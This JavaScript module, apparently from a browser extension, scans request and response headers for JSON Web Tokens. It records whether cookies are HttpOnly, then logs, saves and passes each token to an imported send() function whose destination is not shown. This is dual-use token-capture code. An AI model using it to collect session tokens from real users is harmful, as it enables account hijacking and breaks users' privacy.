import { save, send } from './utilities'
import {JWT, findJWT } from './jwt'

const isHttpOnly = value => {
    // case insensitive as per: https://datatracker.ietf.org/doc/html/rfc6265#section-5.2.6
    return value.toLowerCase().includes('httponly')
}

const processHeader = (req, header, match) => {
    const httpOnly = isHttpOnly(header.value)
    const data = JWT(match, {url: req.url, type: 'H', name: header.name, httpOnly})
    console.log('JWT FOUND', data)
    save(data)
    send(data)
}

const onHeaderHandler = (req, headers) => {
    headers.forEach(header => {
        const match = findJWT(header.value)
        if (match !== null) {
            processHeader(req, header, match)
        }
    })
}

const onSendHeadersHandler = req => {
    if (void 0 !== req.requestHeaders) {
        onHeaderHandler(req, req.requestHeaders)
    }
}

const onHeadersReceivedHandler = req => {
    if (void 0 !== req.responseHeaders) {
        onHeaderHandler(req, req.responseHeaders)
    }
}

export { onSendHeadersHandler, onHeadersReceivedHandler }